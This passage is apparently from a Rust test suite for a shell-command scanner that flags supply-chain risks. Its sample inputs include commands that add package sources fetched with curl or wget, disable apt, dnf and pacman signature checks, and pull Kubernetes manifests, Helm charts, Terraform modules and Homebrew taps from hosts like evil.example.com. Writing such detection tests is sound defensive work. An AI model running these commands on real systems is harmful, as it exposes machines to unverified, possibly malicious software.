            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_curl_redirect_sources_list_no_space() {
        // Redirect operator glued to the path must still be caught.
        assert!(has(
            "curl https://x.example.com/r >/etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
        assert!(has(
            "wget -qO- https://x.example.com/r >>/etc/apt/sources.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_redirect_targets_sources_list_helper() {
        assert!(redirect_targets_sources_list(
            "curl x > /etc/apt/sources.list.d/y"
        ));
        assert!(redirect_targets_sources_list(
            "curl x >/etc/apt/sources.list"
        ));
        assert!(redirect_targets_sources_list(
            "curl x >> /etc/apt/sources.list.d/y"
        ));
        // A `>` redirect to an unrelated file must not match.
        assert!(!redirect_targets_sources_list("curl x > /tmp/out.txt"));
        // `sources.list` mentioned but not as a redirect target.
        assert!(!redirect_targets_sources_list("cat /etc/apt/sources.list"));
    }

    #[test]
    fn test_local_cat_into_tee_sources_list_no_fire() {
        // A local file piped into tee is not a download-from-network attack.
        assert!(!has(
            "cat ./my-repo.list | sudo tee /etc/apt/sources.list.d/my.list",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    #[test]
    fn test_curl_pipe_tee_non_sources_no_fire() {
        // tee into a normal file is fine.
        assert!(!has(
            "curl https://x.example.com/f | sudo tee /tmp/out.txt",
            ShellType::Posix,
            RuleId::RepoAddFromPipe,
        ));
    }

    // ── unsigned_repo_trust ─────────────────────────────────────────────────

    #[test]
    fn test_apt_trusted_yes_in_sources_entry() {
        assert!(has(
            "echo 'deb [trusted=yes] http://repo.example.com/ ./' | sudo tee /etc/apt/sources.list.d/x.list",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_trusted_yes_with_other_options() {
        assert!(raw_has_trusted_yes(
            "deb [arch=amd64 trusted=yes] http://r ./"
        ));
        assert!(raw_has_trusted_yes("deb [ trusted=yes ] http://r ./"));
    }

    #[test]
    fn test_apt_allow_unauthenticated() {
        assert!(has(
            "sudo apt-get install --allow-unauthenticated somepkg",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_allow_insecure_repositories() {
        assert!(has(
            "sudo apt-get update --allow-insecure-repositories",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_apt_install_plain_no_fire() {
        assert!(none("sudo apt-get install nginx", ShellType::Posix));
        assert!(none("apt install build-essential", ShellType::Posix));
    }

    #[test]
    fn test_trusted_no_value_no_fire() {
        // `[trusted]` without `=yes` is not the disable-verification marker.
        assert!(!raw_has_trusted_yes("deb [trusted] http://r ./"));
        assert!(!raw_has_trusted_yes("deb [trusted=no] http://r ./"));
    }

    // ── gpg_check_disabled ──────────────────────────────────────────────────

    #[test]
    fn test_dnf_nogpgcheck() {
        assert!(has(
            "sudo dnf install --nogpgcheck somepkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_yum_nogpgcheck() {
        assert!(has(
            "sudo yum install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_gpgcheck_zero_inline() {
        assert!(has(
            "echo 'gpgcheck=0' | sudo tee -a /etc/yum.repos.d/x.repo",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_gpgcheck_zero_word_boundary_across_occurrences() {
        // Regression: the boundary check must use absolute offsets. A leading
        // non-boundary occurrence must not corrupt the check for a later,
        // genuine `gpgcheck=0` at a word boundary.
        assert!(raw_has_gpgcheck_zero("xgpgcheck=1 gpgcheck=0"));
        // A single non-boundary occurrence (`gpgcheck` glued to a prefix).
        assert!(!raw_has_gpgcheck_zero("mygpgcheck=0"));
    }

    #[test]
    fn test_pacman_siglevel_never() {
        assert!(has(
            "echo 'SigLevel = Never' | sudo tee -a /etc/pacman.conf",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_dnf_install_plain_no_fire() {
        assert!(none("sudo dnf install httpd", ShellType::Posix));
    }

    #[test]
    fn test_gpgcheck_one_no_fire() {
        // gpgcheck=1 is the secure setting.
        assert!(!raw_has_gpgcheck_zero("gpgcheck=1"));
        assert!(!raw_has_gpgcheck_zero("repo_gpgcheck=0xff"));
    }

    #[test]
    fn test_gpgcheck_zero_spacing() {
        assert!(raw_has_gpgcheck_zero("gpgcheck = 0"));
        assert!(raw_has_gpgcheck_zero("GPGCHECK=0"));
    }

    // ── kubectl_apply_remote ────────────────────────────────────────────────

    #[test]
    fn test_kubectl_apply_raw_github() {
        assert!(has(
            "kubectl apply -f https://raw.githubusercontent.com/x/y/main/deploy.yaml",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_apply_shortened_url() {
        assert!(has(
            "kubectl apply -f https://bit.ly/abc123",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    #[test]
    fn test_kubectl_apply_local_file_no_fire() {
        assert!(none("kubectl apply -f ./deploy.yaml", ShellType::Posix));
        assert!(none("kubectl apply -f manifests/", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_apply_kustomize_dir_no_fire() {
        assert!(none("kubectl apply -k ./overlays/prod", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_get_no_fire() {
        assert!(none("kubectl get pods -o yaml", ShellType::Posix));
    }

    #[test]
    fn test_kubectl_apply_filename_long_flag() {
        assert!(has(
            "kubectl apply --filename=https://raw.githubusercontent.com/x/y/m/d.yaml",
            ShellType::Posix,
            RuleId::KubectlApplyRemote,
        ));
    }

    // ── helm_untrusted_repo ─────────────────────────────────────────────────

    #[test]
    fn test_helm_repo_add_untrusted() {
        assert!(has(
            "helm repo add evil https://charts.evil.example.com",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_install_untrusted_repo_flag() {
        assert!(has(
            "helm install myapp mychart --repo https://charts.evil.example.com",
            ShellType::Posix,
            RuleId::HelmUntrustedRepo,
        ));
    }

    #[test]
    fn test_helm_repo_add_trusted_no_fire() {
        assert!(none(
            "helm repo add bitnami https://charts.bitnami.com/bitnami",
            ShellType::Posix,
        ));
    }

    #[test]
    fn test_helm_install_local_chart_no_fire() {
        assert!(none("helm install myapp ./mychart", ShellType::Posix));
    }

    #[test]
    fn test_helm_list_no_fire() {
        assert!(none("helm list -A", ShellType::Posix));
    }

    // ── terraform_remote_module ─────────────────────────────────────────────

    #[test]
    fn test_terraform_from_module_remote() {
        assert!(has(
            "terraform init -from-module=git::https://evil.example.com/m.git",
            ShellType::Posix,
            RuleId::TerraformRemoteModule,
        ));
    }

    #[test]
    fn test_terraform_from_module_github() {
        assert!(has(
            "terraform init -from-module github.com/evil/tf-module",
            ShellType::Posix,
            RuleId::TerraformRemoteModule,
        ));
    }

    #[test]
    fn test_terraform_from_module_local_no_fire() {
        assert!(none(
            "terraform init -from-module=./modules/vpc",
            ShellType::Posix,
        ));
    }

    #[test]
    fn test_terraform_init_plain_no_fire() {
        assert!(none("terraform init", ShellType::Posix));
        assert!(none("terraform apply -auto-approve", ShellType::Posix));
    }

    #[test]
    fn test_terraform_registry_shorthand_no_fire() {
        assert!(!is_untrusted_module_source("hashicorp/consul/aws"));
        assert!(!is_untrusted_module_source(
            "registry.terraform.io/hashicorp/vpc/aws"
        ));
    }

    // ── brew_untrusted_tap ──────────────────────────────────────────────────

    #[test]
    fn test_brew_install_url() {
        assert!(has(
            "brew install https://evil.example.com/x.rb",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_tap_arbitrary_url() {
        assert!(has(
            "brew tap user/repo https://git.evil.example.com/homebrew-tap.git",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_tap_ssh_github_url_no_fire() {
        // An SSH (SCP-syntax) GitHub tap URL is the normal case — it must not
        // be misclassified as an untrusted remote.
        assert!(none(
            "brew tap user/repo git@github.com:user/homebrew-tap.git",
            ShellType::Posix,
        ));
        // A non-GitHub SSH remote still fires.
        assert!(has(
            "brew tap user/repo git@evil.example.com:user/homebrew-tap.git",
            ShellType::Posix,
            RuleId::BrewUntrustedTap,
        ));
    }

    #[test]
    fn test_brew_install_plain_no_fire() {
        assert!(none("brew install ripgrep", ShellType::Posix));
        assert!(none("brew install --cask firefox", ShellType::Posix));
    }

    #[test]
    fn test_brew_tap_github_no_fire() {
        // A plain tap (implicit github.com) or an explicit github.com URL is fine.
        assert!(none("brew tap homebrew/cask-fonts", ShellType::Posix));
        assert!(none(
            "brew tap user/repo https://github.com/user/homebrew-repo",
            ShellType::Posix,
        ));
    }

    // ── wrapper resolution ──────────────────────────────────────────────────

    #[test]
    fn test_doas_wrapper_resolved() {
        assert!(has(
            "doas dnf install --nogpgcheck pkg",
            ShellType::Posix,
            RuleId::GpgCheckDisabled,
        ));
    }

    #[test]
    fn test_sudo_u_flag_resolved() {
        assert!(has(
            "sudo -u root apt-get install --allow-unauthenticated pkg",
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }

    #[test]
    fn test_url_host_parsing() {
        assert_eq!(
            url_host("https://user:pw@charts.example.com:8443/path"),
            Some("charts.example.com".to_string())
        );
        assert_eq!(
            url_host("https://raw.githubusercontent.com/x/y"),
            Some("raw.githubusercontent.com".to_string())
        );
    }

    #[test]
    fn test_quoted_args() {
        // Quoting must not defeat detection.
        assert!(has(
            r#"sudo apt-get install "--allow-unauthenticated" pkg"#,
            ShellType::Posix,
            RuleId::UnsignedRepoTrust,
        ));
    }
}
